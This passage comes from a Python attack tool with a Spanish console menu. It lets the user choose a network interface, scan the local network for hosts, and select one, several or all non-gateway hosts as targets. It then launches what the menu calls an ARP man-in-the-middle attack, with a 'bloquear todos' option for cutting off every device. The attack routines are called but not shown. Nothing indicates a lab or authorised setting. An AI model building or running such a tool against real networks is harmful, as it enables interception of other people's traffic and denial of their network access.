    for i, nombre in enumerate(interfaces_disponibles, start=1):
        interfaz_map[str(i)] = nombre
        print(f" {ACCENT_COLOR}{i}.{Style.RESET_ALL} {MAIN_COLOR}{nombre}{Style.RESET_ALL}")

    interfaz = None
    while not interfaz:
        seleccion = input(
            f"{ACCENT_COLOR}Elige la **interfaz** para escanear y atacar (ej. 1, 2, o 'eth0'): {Style.RESET_ALL}"
        ).strip()
        if seleccion in interfaz_map:
            interfaz = interfaz_map[seleccion]
        elif seleccion in interfaces_disponibles:
            interfaz = seleccion
        else:
            print(f"{ERROR_COLOR}Selección no válida. Inténtalo de nuevo.{Style.RESET_ALL}")

    print(f"{MAIN_COLOR}Interfaz seleccionada: {interfaz}{Style.RESET_ALL}")

    hosts_descubiertos = []
    ips_objetivo       = []

    while True:
        OK_TITLE = f"{MAIN_COLOR}[OK]{Style.RESET_ALL}"
        print(f"\n{OK_TITLE} Interfaz {interfaz} - Modo: Monitor/Ataque{Style.RESET_ALL}")

        accion = input(f"{ACCENT_COLOR}Selecciona una **Acción**: (1) Escanear Red, (2) Iniciar Ataque ARP, (3) Salir del Script: {Style.RESET_ALL}").strip()

        if accion == "1" or accion.lower() == "escanear":
            hosts_descubiertos = escanear_red_y_obtener_hosts(interfaz)
            mostrar_tabla_hosts(hosts_descubiertos)

        elif accion == "2" or accion.lower() == "atacar":
            if not hosts_descubiertos:
                print(f"{ERROR_COLOR}Escanéa la red (Opción 1) primero para seleccionar objetivos.{Style.RESET_ALL}")
                continue

            print("\n")

            while True:
                ip_o_num = input(f"{ACCENT_COLOR}Indica el(los) **Objetivo(s)**: ID(s) (ej: 1,3), IP (ej: 192.168.1.44), 'manual', o 'todos': {Style.RESET_ALL}").strip().lower()
                ips_objetivo = []

                if ip_o_num in ('todos', 'all', 'bloquear todos'):
                    ips_objetivo = [h['ip'] for h in hosts_descubiertos if h['hostname'] != '_gateway']
                    if not ips_objetivo:
                        print(f"{ERROR_COLOR}No hay equipos disponibles (excluyendo gateway).{Style.RESET_ALL}")
                        continue
                    print(f"{ACCENT_COLOR}Todos los equipos seleccionados para el ataque.{Style.RESET_ALL}")
                    break

                elif ip_o_num == 'manual':
                    ip_manual = input(f"{ACCENT_COLOR} IP objetivo manual: {Style.RESET_ALL}").strip()
                    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', ip_manual):
                        ips_objetivo.append(ip_manual)
                        break
                    else:
                        print(f"{ERROR_COLOR}IP no válida. Inténtalo de nuevo.{Style.RESET_ALL}")

                else:
                    try:
                        partes = [p.strip() for p in ip_o_num.split(',')]
                        valido = True
                        for parte in partes:
                            if parte.isdigit():
                                idx = int(parte)
                                if 0 <= idx < len(hosts_descubiertos):
                                    ips_objetivo.append(hosts_descubiertos[idx]['ip'])
                                else:
                                    print(f"{ERROR_COLOR}ID '{parte}' fuera de rango.{Style.RESET_ALL}")
                                    valido = False; break
                            elif re.match(r'^\d{1,3}(\.\d{1,3}){3}$', parte):
                                ips_objetivo.append(parte)
                            else:
                                print(f"{ERROR_COLOR}Entrada no válida: '{parte}'.\nInténtalo de nuevo.{Style.RESET_ALL}")
                                valido = False; break

                        if valido and ips_objetivo:
                            ips_objetivo = list(dict.fromkeys(ips_objetivo))
                            break
                        elif valido:
                            print(f"{ERROR_COLOR}No se ingresó ninguna IP válida.{Style.RESET_ALL}")
                    except Exception:
                        print(f"{ERROR_COLOR}Error al procesar la entrada. Inténtalo de nuevo.{Style.RESET_ALL}")

            if ips_objetivo:
                iniciar_ataque_mitm(interfaz, ips_objetivo, hosts_descubiertos)
                STOP_EVENT.clear()

        elif accion == "3" or accion.lower() == "salir":
            print(f"{ACCENT_COLOR}Saliendo...{Style.RESET_ALL}")
            sys.exit(0)

        else:
            print(f"{ERROR_COLOR}Opción no válida.{Style.RESET_ALL}")
